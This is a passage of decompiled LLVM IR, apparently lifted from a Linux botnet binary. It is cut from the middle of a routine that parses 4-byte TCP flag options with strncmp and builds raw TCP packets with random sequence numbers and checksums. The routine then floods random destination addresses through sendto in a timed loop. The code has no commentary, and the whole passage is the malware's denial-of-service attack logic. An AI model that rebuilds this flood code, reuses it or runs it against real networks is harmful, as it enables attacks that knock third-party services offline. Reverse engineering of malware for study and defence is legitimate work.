  %v2_804ea11 = or i1 %v0_804ea11, %v9_804ea0f
  %v3_804ea11 = zext i1 %v2_804ea11 to i32
  %v4_804ea11 = load i32, i32* @edx, align 4
  %v5_804ea11 = and i32 %v4_804ea11, -256
  %v6_804ea11 = or i32 %v3_804ea11, %v5_804ea11
  %v7_804ea11 = xor i32 %v6_804ea11, 1
  store i32 %v7_804ea11, i32* %edx.global-to-local, align 4
  %v3_804ea17 = and i32 %v7_804ea0f, -256
  %v1_804ea19 = trunc i32 %v7_804ea11 to i8
  %v3_804ea19 = zext i1 %v0_804ea11 to i8
  %v4_804ea19 = sub nsw i8 %v1_804ea19, %v3_804ea19
  %v15_804ea19 = icmp eq i8 %v4_804ea19, 0
  %v20_804ea19 = zext i8 %v4_804ea19 to i32
  %v23_804ea19 = or i32 %v20_804ea19, %v3_804ea17
  store i32 %v23_804ea19, i32* @ecx, align 4
  %v2_804ea1d = sext i8 %v4_804ea19 to i32
  store i32 %v2_804ea1d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea22 = icmp eq i1 %v15_804ea19, false
  br i1 %v1_804ea22, label %dec_label_pc_804ea36, label %dec_label_pc_804ea24

dec_label_pc_804ea24:                             ; preds = %dec_label_pc_804e9f1
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804ea27 = load i8, i8* %v2_804eb62, align 1
  %v2_804ea2b = or i8 %v3_804ea27, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ea2b = zext i8 %v2_804ea2b to i32
  store i32 %v7_804ea2b, i32* @edx, align 4
  store i8 %v2_804ea2b, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804ea36:                             ; preds = %dec_label_pc_804e9f1
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059617.308 to i32), i32* @edi, align 4
  %v7_804ea54 = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059617.308, i32 0, i32 0), i32 4)
  %v8_804ea54 = urem i32 %v7_804ea54, 2
  %v9_804ea54 = icmp eq i32 %v8_804ea54, 0
  %v0_804ea56 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea56 = or i1 %v0_804ea56, %v9_804ea54
  %v3_804ea56 = zext i1 %v2_804ea56 to i32
  %v4_804ea56 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ea56 = and i32 %v4_804ea56, -256
  %v6_804ea56 = or i32 %v3_804ea56, %v5_804ea56
  %v7_804ea56 = xor i32 %v6_804ea56, 1
  store i32 %v7_804ea56, i32* %edx.global-to-local, align 4
  %v3_804ea5c = and i32 %v7_804ea54, -256
  %v1_804ea5e = trunc i32 %v7_804ea56 to i8
  %v3_804ea5e = zext i1 %v0_804ea56 to i8
  %v4_804ea5e = sub nsw i8 %v1_804ea5e, %v3_804ea5e
  %v15_804ea5e = icmp eq i8 %v4_804ea5e, 0
  %v20_804ea5e = zext i8 %v4_804ea5e to i32
  %v23_804ea5e = or i32 %v20_804ea5e, %v3_804ea5c
  store i32 %v23_804ea5e, i32* @ecx, align 4
  %v2_804ea62 = sext i8 %v4_804ea5e to i32
  store i32 %v2_804ea62, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea67 = icmp eq i1 %v15_804ea5e, false
  br i1 %v1_804ea67, label %dec_label_pc_804ea7b, label %dec_label_pc_804ea69

dec_label_pc_804ea69:                             ; preds = %dec_label_pc_804ea36
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804ea6c = load i8, i8* %v2_804eb62, align 1
  %v2_804ea70 = or i8 %v3_804ea6c, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804ea70 = zext i8 %v2_804ea70 to i32
  store i32 %v7_804ea70, i32* @edx, align 4
  store i8 %v2_804ea70, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804ea7b:                             ; preds = %dec_label_pc_804ea36
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805961b.309 to i32), i32* @edi, align 4
  %v7_804ea9f = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805961b.309, i32 0, i32 0), i32 4)
  %v8_804ea9f = urem i32 %v7_804ea9f, 2
  %v9_804ea9f = icmp eq i32 %v8_804ea9f, 0
  %v0_804eaa1 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eaa1 = or i1 %v0_804eaa1, %v9_804ea9f
  %v3_804eaa1 = zext i1 %v2_804eaa1 to i32
  %v4_804eaa1 = load i32, i32* %edx.global-to-local, align 4
  %v5_804eaa1 = and i32 %v4_804eaa1, -256
  %v6_804eaa1 = or i32 %v3_804eaa1, %v5_804eaa1
  %v7_804eaa1 = xor i32 %v6_804eaa1, 1
  store i32 %v7_804eaa1, i32* %edx.global-to-local, align 4
  %v3_804eaa7 = and i32 %v7_804ea9f, -256
  %v1_804eaa9 = trunc i32 %v7_804eaa1 to i8
  %v3_804eaa9 = zext i1 %v0_804eaa1 to i8
  %v4_804eaa9 = sub nsw i8 %v1_804eaa9, %v3_804eaa9
  %v15_804eaa9 = icmp eq i8 %v4_804eaa9, 0
  %v20_804eaa9 = zext i8 %v4_804eaa9 to i32
  %v23_804eaa9 = or i32 %v20_804eaa9, %v3_804eaa7
  store i32 %v23_804eaa9, i32* @ecx, align 4
  %v2_804eaad = sext i8 %v4_804eaa9 to i32
  store i32 %v2_804eaad, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eab2 = icmp eq i1 %v15_804eaa9, false
  br i1 %v1_804eab2, label %dec_label_pc_804eac6, label %dec_label_pc_804eab4

dec_label_pc_804eab4:                             ; preds = %dec_label_pc_804ea7b
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804eab7 = load i8, i8* %v2_804eb62, align 1
  %v2_804eabb = or i8 %v3_804eab7, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eabb = zext i8 %v2_804eabb to i32
  store i32 %v7_804eabb, i32* @edx, align 4
  store i8 %v2_804eabb, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804eac6:                             ; preds = %dec_label_pc_804ea7b
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805961f.310 to i32), i32* @edi, align 4
  %v7_804eaf6 = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805961f.310, i32 0, i32 0), i32 4)
  %v8_804eaf6 = urem i32 %v7_804eaf6, 2
  %v9_804eaf6 = icmp eq i32 %v8_804eaf6, 0
  %v0_804eaf8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804eaf8 = or i1 %v0_804eaf8, %v9_804eaf6
  %v3_804eaf8 = zext i1 %v2_804eaf8 to i32
  %v4_804eaf8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804eaf8 = and i32 %v4_804eaf8, -256
  %v6_804eaf8 = or i32 %v3_804eaf8, %v5_804eaf8
  %v7_804eaf8 = xor i32 %v6_804eaf8, 1
  store i32 %v7_804eaf8, i32* %edx.global-to-local, align 4
  %v3_804eafe = and i32 %v7_804eaf6, -256
  %v1_804eb00 = trunc i32 %v7_804eaf8 to i8
  %v3_804eb00 = zext i1 %v0_804eaf8 to i8
  %v4_804eb00 = sub nsw i8 %v1_804eb00, %v3_804eb00
  %v15_804eb00 = icmp eq i8 %v4_804eb00, 0
  %v20_804eb00 = zext i8 %v4_804eb00 to i32
  %v23_804eb00 = or i32 %v20_804eb00, %v3_804eafe
  store i32 %v23_804eb00, i32* @ecx, align 4
  %v2_804eb04 = sext i8 %v4_804eb00 to i32
  store i32 %v2_804eb04, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb09 = icmp eq i1 %v15_804eb00, false
  br i1 %v1_804eb09, label %dec_label_pc_804eb1a, label %dec_label_pc_804eb0b

dec_label_pc_804eb0b:                             ; preds = %dec_label_pc_804eac6
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804eb0e = load i8, i8* %v2_804eb62, align 1
  %v2_804eb12 = or i8 %v3_804eb0e, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eb12 = zext i8 %v2_804eb12 to i32
  store i32 %v7_804eb12, i32* @edx, align 4
  store i8 %v2_804eb12, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb1a:                             ; preds = %dec_label_pc_804eac6
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804e9f1, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059623.311 to i32), i32* @edi, align 4
  %v7_804eb4a = call i32 @_strncmp(i8* %v3_804eb74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059623.311, i32 0, i32 0), i32 4)
  %v8_804eb4a = urem i32 %v7_804eb4a, 2
  %v9_804eb4a = icmp eq i32 %v8_804eb4a, 0
  %v0_804eb4c = load i1, i1* %cf.global-to-local, align 1
  %v2_804eb4c = or i1 %v0_804eb4c, %v9_804eb4a
  %v3_804eb4c = zext i1 %v2_804eb4c to i32
  %v4_804eb4c = load i32, i32* %edx.global-to-local, align 4
  %v5_804eb4c = and i32 %v4_804eb4c, -256
  %v6_804eb4c = or i32 %v3_804eb4c, %v5_804eb4c
  %v7_804eb4c = xor i32 %v6_804eb4c, 1
  store i32 %v7_804eb4c, i32* %edx.global-to-local, align 4
  %v3_804eb52 = and i32 %v7_804eb4a, -256
  %v1_804eb54 = trunc i32 %v7_804eb4c to i8
  %v3_804eb54 = zext i1 %v0_804eb4c to i8
  %v4_804eb54 = sub nsw i8 %v1_804eb54, %v3_804eb54
  %v15_804eb54 = icmp eq i8 %v4_804eb54, 0
  %v20_804eb54 = zext i8 %v4_804eb54 to i32
  %v23_804eb54 = or i32 %v20_804eb54, %v3_804eb52
  store i32 %v23_804eb54, i32* @ecx, align 4
  %v2_804eb58 = sext i8 %v4_804eb54 to i32
  store i32 %v2_804eb58, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb5d = icmp eq i1 %v15_804eb54, false
  br i1 %v1_804eb5d, label %dec_label_pc_804eb6e, label %dec_label_pc_804eb5f

dec_label_pc_804eb5f:                             ; preds = %dec_label_pc_804eb1a
  store i32 %v1_804e8ec, i32* @eax, align 4
  %v3_804eb62 = load i8, i8* %v2_804eb62, align 1
  %v2_804eb66 = or i8 %v3_804eb62, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804eb66 = zext i8 %v2_804eb66 to i32
  store i32 %v7_804eb66, i32* @edx, align 4
  store i8 %v2_804eb66, i8* %v2_804eb62, align 1
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb6e:                             ; preds = %dec_label_pc_804eb1a
  %v0_804eb6e = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804eb6e, i32* %edx.global-to-local, align 4
  store i32 %v4_804e9f1, i32* %eax.global-to-local, align 4
  %v1_804eb77 = load i32, i32* @esp, align 4
  %v2_804eb77 = add i32 %v1_804eb77, 8
  %v3_804eb77 = inttoptr i32 %v2_804eb77 to i32*
  store i32 %v4_804e9f1, i32* %v3_804eb77, align 4
  %v0_804eb7b = load i32, i32* @esp, align 4
  %v1_804eb7b = add i32 %v0_804eb7b, 4
  %v2_804eb7b = inttoptr i32 %v1_804eb7b to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8059627.312 to i32), i32* %v2_804eb7b, align 4
  %v0_804eb83 = load i32, i32* %edx.global-to-local, align 4
  %v1_804eb83 = load i32, i32* @esp, align 4
  %v2_804eb83 = inttoptr i32 %v1_804eb83 to i32*
  store i32 %v0_804eb83, i32* %v2_804eb83, align 4
  %v3_804eb86 = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8059623.311 to i32))
  store i32 %v3_804eb86, i32* @eax, align 4
  br label %dec_label_pc_804eb8b

dec_label_pc_804eb8b:                             ; preds = %dec_label_pc_804eb5f, %dec_label_pc_804eb0b, %dec_label_pc_804eab4, %dec_label_pc_804ea69, %dec_label_pc_804ea24, %dec_label_pc_804eb6e
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059623.311, i32 0, i32 0), %dec_label_pc_804eb6e ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059623.311, i32 0, i32 0), %dec_label_pc_804eb5f ], [ %stack_var_-156.125, %dec_label_pc_804eb0b ], [ %stack_var_-156.125, %dec_label_pc_804eab4 ], [ %stack_var_-156.125, %dec_label_pc_804ea69 ], [ %stack_var_-156.125, %dec_label_pc_804ea24 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804eb6e ], [ 4, %dec_label_pc_804eb5f ], [ %stack_var_-160.126, %dec_label_pc_804eb0b ], [ %stack_var_-160.126, %dec_label_pc_804eab4 ], [ %stack_var_-160.126, %dec_label_pc_804ea69 ], [ %stack_var_-160.126, %dec_label_pc_804ea24 ]
  %v0_804eb8b = load i32, i32* @esp, align 4
  %v1_804eb8b = add i32 %v0_804eb8b, 4
  %v2_804eb8b = inttoptr i32 %v1_804eb8b to i32*
  store i32 ptrtoint (i32* @global_var_8059611.306 to i32), i32* %v2_804eb8b, align 4
  %v0_804eb93 = load i32, i32* @esp, align 4
  %v1_804eb93 = inttoptr i32 %v0_804eb93 to i32*
  store i32 0, i32* %v1_804eb93, align 4
  %v2_804eb9a = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804eb9a = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804eb9a)
  store i32 %v3_804eb9a, i32* %eax.global-to-local, align 4
  store i32 %v3_804eb9a, i32* %tmp91, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804eba2 = icmp eq i32 %v3_804eb9a, 0
  %v1_804eba6 = icmp eq i1 %v5_804eba2, false
  %tmp92 = inttoptr i32 %v3_804eb9a to i8*
  br i1 %v1_804eba6, label %dec_label_pc_804e9f1, label %dec_label_pc_804ebac

dec_label_pc_804ebac:                             ; preds = %dec_label_pc_804eb8b, %dec_label_pc_804e9d6, %dec_label_pc_804e995
  %v0_804ebac = phi i8* [ %v0_804ebac.pre, %dec_label_pc_804e995 ], [ %v5_804e9e9, %dec_label_pc_804e9d6 ], [ %tmp92, %dec_label_pc_804eb8b ]
  %v1_804ebac = ptrtoint i8* %v0_804ebac to i32
  %v2_804ebac = call i32 @rand_cmwc(i32 %v1_804ebac)
  %v1_804ebb1 = urem i32 %v2_804ebac, 65536
  store i32 %v1_804ebb1, i32* %edx.global-to-local, align 4
  %v1_804ebb7 = trunc i32 %v2_804ebac to i16
  %v3_804ebb7 = add i32 %v2_804e8d4, 34
  %v4_804ebb7 = inttoptr i32 %v3_804ebb7 to i16*
  store i16 %v1_804ebb7, i16* %v4_804ebb7, align 2
  %v1_804ebbe = add i32 %v2_804e8d4, 36
  %v2_804ebbe = inttoptr i32 %v1_804ebbe to i16*
  store i16 0, i16* %v2_804ebbe, align 4
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  %v1_804ebc7 = add i32 %v2_804e8d4, 38
  %v2_804ebc7 = inttoptr i32 %v1_804ebc7 to i16*
  store i16 0, i16* %v2_804ebc7, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804e7a4, label %dec_label_pc_804ebe0, label %dec_label_pc_804ebd3

dec_label_pc_804ebd3:                             ; preds = %dec_label_pc_804ebac
  %v0_804ebd3 = load i8*, i8** %stack_var_-20, align 4
  %v1_804ebd3 = ptrtoint i8* %v0_804ebd3 to i32
  %v2_804ebd3 = call i32 @rand_cmwc(i32 %v1_804ebd3)
  br label %dec_label_pc_804ebf4

dec_label_pc_804ebe0:                             ; preds = %dec_label_pc_804ebac
  %v1_804ebe3 = urem i32 %arg2, 65536
  store i32 %v1_804ebe3, i32* %eax.global-to-local, align 4
  %v1_804ebe6 = load i32, i32* @esp, align 4
  %v2_804ebe6 = inttoptr i32 %v1_804ebe6 to i32*
  store i32 %v1_804ebe3, i32* %v2_804ebe6, align 4
  %v3_804ebe9 = call i32 @htons(i16 %tmp39)
  br label %dec_label_pc_804ebf4

dec_label_pc_804ebf4:                             ; preds = %dec_label_pc_804ebd3, %dec_label_pc_804ebe0
  %storemerge12.in = phi i32 [ %v2_804ebd3, %dec_label_pc_804ebd3 ], [ %v3_804ebe9, %dec_label_pc_804ebe0 ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804ebf7 = sdiv i32 %sext, 65536
  store i32 %v4_804ebf7, i32* @esi, align 4
  %v3_804ebfa = add i32 %v2_804e8d4, 22
  %v4_804ebfa = inttoptr i32 %v3_804ebfa to i16*
  store i16 %storemerge, i16* %v4_804ebfa, align 2
  %v1_804ec01 = load i32, i32* @esp, align 4
  %v2_804ec01 = add i32 %v1_804ec01, 4
  %v3_804ec01 = inttoptr i32 %v2_804ec01 to i32*
  store i32 %v1_804e8ec, i32* %v3_804ec01, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec08 = load i32, i32* @esp, align 4
  %v2_804ec08 = inttoptr i32 %v1_804ec08 to i32*
  store i32 %v2_804e8d4, i32* %v2_804ec08, align 4
  %v0_804ec0b = call i32 @tcpcsum()
  %v1_804ec10 = urem i32 %v0_804ec0b, 65536
  store i32 %v1_804ec10, i32* %edx.global-to-local, align 4
  %v1_804ec16 = trunc i32 %v0_804ec0b to i16
  store i16 %v1_804ec16, i16* %v2_804ebbe, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec1d = or i32 %v2_804e8d4, 2
  %v2_804ec1d = inttoptr i32 %v1_804ec1d to i16*
  %v3_804ec1d = load i16, i16* %v2_804ec1d, align 2
  %v4_804ec1d = zext i16 %v3_804ec1d to i32
  store i32 %v4_804ec1d, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec26 = load i32, i32* @esp, align 4
  %v2_804ec26 = add i32 %v1_804ec26, 4
  %v3_804ec26 = inttoptr i32 %v2_804ec26 to i32*
  store i32 %v4_804ec1d, i32* %v3_804ec26, align 4
  %v0_804ec2a = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec2a = load i32, i32* @esp, align 4
  %v2_804ec2a = inttoptr i32 %v1_804ec2a to i32*
  store i32 %v0_804ec2a, i32* %v2_804ec2a, align 4
  %v3_804ec2d = inttoptr i32 %v4_804ebf7 to i16*
  %v4_804ec2d = call i32 @csum(i16* %v3_804ec2d, i32 %v15_804e789)
  %v1_804ec32 = urem i32 %v4_804ec2d, 65536
  store i32 %v1_804ec32, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ec38 = trunc i32 %v4_804ec2d to i16
  %v3_804ec38 = or i32 %v2_804e8d4, 10
  %v4_804ec38 = inttoptr i32 %v3_804ec38 to i16*
  store i16 %v1_804ec38, i16* %v4_804ec38, align 2
  %v0_804ec3c = load i32, i32* @esp, align 4
  %v1_804ec3c = inttoptr i32 %v0_804ec3c to i32*
  store i32 0, i32* %v1_804ec3c, align 4
  %v2_804ec43 = inttoptr i32 %v4_804ebf7 to i32*
  %v3_804ec43 = call i32 @__GI_time(i32* %v2_804ec43)
  %v5_804ec48 = add i32 %v3_804ec43, %arg3
  %v10_804ec48 = icmp ult i32 %v5_804ec48, %v3_804ec43
  store i1 %v10_804ec48, i1* %cf.global-to-local, align 1
  store i32 %v5_804ec48, i32* %eax.global-to-local, align 4
  %v2_804ec9f = or i32 %v2_804e8d4, 12
  %v3_804ec9f = inttoptr i32 %v2_804ec9f to i32*
  %v3_804ecad = or i32 %v2_804e8d4, 4
  %v4_804ecad = inttoptr i32 %v3_804ecad to i16*
  br label %dec_label_pc_804ec57

dec_label_pc_804ec57:                             ; preds = %dec_label_pc_804ed1b, %dec_label_pc_804ed38, %dec_label_pc_804ebf4
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804ebf4 ], [ %v4_804ed38, %dec_label_pc_804ed38 ], [ 0, %dec_label_pc_804ed1b ]
  store i32 %v2_804e8d4, i32* %edx.global-to-local, align 4
  %v0_804ec5d = load i32, i32* @esp, align 4
  %v1_804ec5d = add i32 %v0_804ec5d, 20
  %v2_804ec5d = inttoptr i32 %v1_804ec5d to i32*
  store i32 16, i32* %v2_804ec5d, align 4
  %v1_804ec65 = load i32, i32* @esp, align 4
  %v2_804ec65 = add i32 %v1_804ec65, 16
  %v3_804ec65 = inttoptr i32 %v2_804ec65 to i32*
  store i32 %v2_804e7c9, i32* %v3_804ec65, align 4
  %v0_804ec69 = load i32, i32* @esp, align 4
  %v1_804ec69 = add i32 %v0_804ec69, 12
  %v2_804ec69 = inttoptr i32 %v1_804ec69 to i32*
  store i32 0, i32* %v2_804ec69, align 4
  store i32 %v1_804e8b0, i32* @edi, align 4
  %v1_804ec74 = load i32, i32* @esp, align 4
  %v2_804ec74 = add i32 %v1_804ec74, 8
  %v3_804ec74 = inttoptr i32 %v2_804ec74 to i32*
  store i32 %v1_804e8b0, i32* %v3_804ec74, align 4
  %v0_804ec78 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec78 = load i32, i32* @esp, align 4
  %v2_804ec78 = add i32 %v1_804ec78, 4
  %v3_804ec78 = inttoptr i32 %v2_804ec78 to i32*
  store i32 %v0_804ec78, i32* %v3_804ec78, align 4
  store i32 %v4_804e811, i32* %eax.global-to-local, align 4
  %v1_804ec7f = load i32, i32* @esp, align 4
  %v2_804ec7f = inttoptr i32 %v1_804ec7f to i32*
  store i32 %v4_804e811, i32* %v2_804ec7f, align 4
  %v1_804ec82 = load i32, i32* %stack_var_-64, align 4
  %v2_804ec82 = load i32, i32* %stack_var_-60, align 4
  %v3_804ec82 = load i32, i32* %stack_var_-56, align 4
  %v4_804ec82 = load i32, i32* %stack_var_-52, align 4
  %v6_804ec82 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804ec82, i32 %v2_804ec82, i32 %v3_804ec82, i32 %v4_804ec82, i32 0)
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_804ec8a = load i32, i32* @esp, align 4
  %v2_804ec8a = inttoptr i32 %v1_804ec8a to i32*
  store i32 %storemerge10, i32* %v2_804ec8a, align 4
  %v1_804ec8d = load i32, i32* %stack_var_-64, align 4
  %v2_804ec8d = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804ec8d)
  store i32 %v2_804ec8d, i32* %eax.global-to-local, align 4
  %v1_804ec92 = load i32, i32* @esp, align 4
  %v2_804ec92 = inttoptr i32 %v1_804ec92 to i32*
  store i32 %v2_804ec8d, i32* %v2_804ec92, align 4
  %v0_804ec95 = call i32 @htonl()
  store i32 %v0_804ec95, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  store i32 %v0_804ec95, i32* %v3_804ec9f, align 4
  %v1_804eca2 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804eca7 = urem i32 %v1_804eca2, 65536
  store i32 %v1_804eca7, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ecad = trunc i32 %v1_804eca2 to i16
  store i16 %v1_804ecad, i16* %v4_804ecad, align 4
  %v1_804ecb1 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804ecb1, i32* %edx.global-to-local, align 4
  store i32 %v1_804e8ec, i32* %eax.global-to-local, align 4
  store i32 %v1_804ecb1, i32* %v3_804e947, align 8
  %v1_804ecbe = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804ecc3 = urem i32 %v1_804ecbe, 65536
  store i32 %v1_804ecc3, i32* %edx.global-to-local, align 4
  %v1_804ecc9 = trunc i32 %v1_804ecbe to i16
  store i16 %v1_804ecc9, i16* %v5_804e8ef, align 4
  store i16 0, i16* %v2_804ebbe, align 4
  %v1_804ecd8 = load i32, i32* @esp, align 4
  %v2_804ecd8 = add i32 %v1_804ecd8, 4
  %v3_804ecd8 = inttoptr i32 %v2_804ecd8 to i32*
  store i32 %v1_804e8ec, i32* %v3_804ecd8, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ecdf = load i32, i32* @esp, align 4
  %v2_804ecdf = inttoptr i32 %v1_804ecdf to i32*
  store i32 %v2_804e8d4, i32* %v2_804ecdf, align 4
  %v0_804ece2 = call i32 @tcpcsum()
  %v1_804ece7 = urem i32 %v0_804ece2, 65536
  store i32 %v1_804ece7, i32* %edx.global-to-local, align 4
  %v1_804eced = trunc i32 %v0_804ece2 to i16
  store i16 %v1_804eced, i16* %v2_804ebbe, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v3_804ecf4 = load i16, i16* %v2_804ec1d, align 2
  %v4_804ecf4 = zext i16 %v3_804ecf4 to i32
  store i32 %v4_804ecf4, i32* %edx.global-to-local, align 4
  store i32 %v2_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804ecfd = load i32, i32* @esp, align 4
  %v2_804ecfd = add i32 %v1_804ecfd, 4
  %v3_804ecfd = inttoptr i32 %v2_804ecfd to i32*
  store i32 %v4_804ecf4, i32* %v3_804ecfd, align 4
  %v0_804ed01 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ed01 = load i32, i32* @esp, align 4
  %v2_804ed01 = inttoptr i32 %v1_804ed01 to i32*
  store i32 %v0_804ed01, i32* %v2_804ed01, align 4
  %v1_804ed04 = load i32, i32* %stack_var_-64, align 4
  %v2_804ed04 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804ed04 = call i32 @csum(i16* %v2_804ed04, i32 %v1_804ed04)
  %v1_804ed09 = urem i32 %v3_804ed04, 65536
  store i32 %v1_804ed09, i32* %edx.global-to-local, align 4
  %v1_804ed0f = trunc i32 %v3_804ed04 to i16
  store i16 %v1_804ed0f, i16* %v4_804ec38, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804ed16 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804ed16, i1* %cf.global-to-local, align 1
  %v15_804ed16 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804ed19 = icmp eq i1 %v15_804ed16, false
  br i1 %v1_804ed19, label %dec_label_pc_804ed38, label %dec_label_pc_804ed1b

dec_label_pc_804ed1b:                             ; preds = %dec_label_pc_804ec57
  %v0_804ed1b = load i32, i32* @esp, align 4
  %v1_804ed1b = inttoptr i32 %v0_804ed1b to i32*
  store i32 0, i32* %v1_804ed1b, align 4
  %v1_804ed22 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804ed22 = call i32 @__GI_time(i32* %v1_804ed22)
  store i32 %v2_804ed22, i32* %eax.global-to-local, align 4
  %v10_804ed27 = icmp ult i32 %v2_804ed22, %v5_804ec48
  store i1 %v10_804ed27, i1* %cf.global-to-local, align 1
  %v8_804ed2a = icmp sgt i32 %v2_804ed22, %v5_804ec48
  br i1 %v8_804ed2a, label %dec_label_pc_804ed40, label %dec_label_pc_804ec57

dec_label_pc_804ed38:                             ; preds = %dec_label_pc_804ec57
  %v4_804ed38 = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804ec57

dec_label_pc_804ed40:                             ; preds = %dec_label_pc_804ed1b, %dec_label_pc_804e7c9, %dec_label_pc_804e86e, %dec_label_pc_804e81f
  %v0_804ed4a = phi i32 [ %v4_804e7d9, %dec_label_pc_804e7c9 ], [ %v3_804e87e, %dec_label_pc_804e86e ], [ %v3_804e82f, %dec_label_pc_804e81f ], [ %v2_804ed22, %dec_label_pc_804ed1b ]
  store i32 %v0_804e788, i32* @ebx, align 4
  store i32 %v0_804e787, i32* @esi, align 4
  ret i32 %v0_804ed4a

; uselistorder directives
  uselistorder i32 %v3_804ed04, { 1, 0 }
  uselistorder i32 %v0_804ece2, { 1, 0 }
  uselistorder i32 %v1_804ecbe, { 1, 0 }
  uselistorder i32 %v1_804eca2, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804ec48, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804ec43, { 1, 0 }
  uselistorder i32 %v4_804ec2d, { 1, 0 }
  uselistorder i32 %v0_804ec0b, { 1, 0 }
  uselistorder i32 %v4_804ebf7, { 2, 1, 0 }
  uselistorder i32 %v1_804ebe3, { 1, 0 }
  uselistorder i32 %v2_804ebac, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804eb4c, { 1, 0 }
  uselistorder i32 %v7_804eb4a, { 1, 0 }
  uselistorder i1 %v0_804eaf8, { 1, 0 }
  uselistorder i32 %v7_804eaf6, { 1, 0 }
  uselistorder i1 %v0_804eaa1, { 1, 0 }
  uselistorder i32 %v7_804ea9f, { 1, 0 }
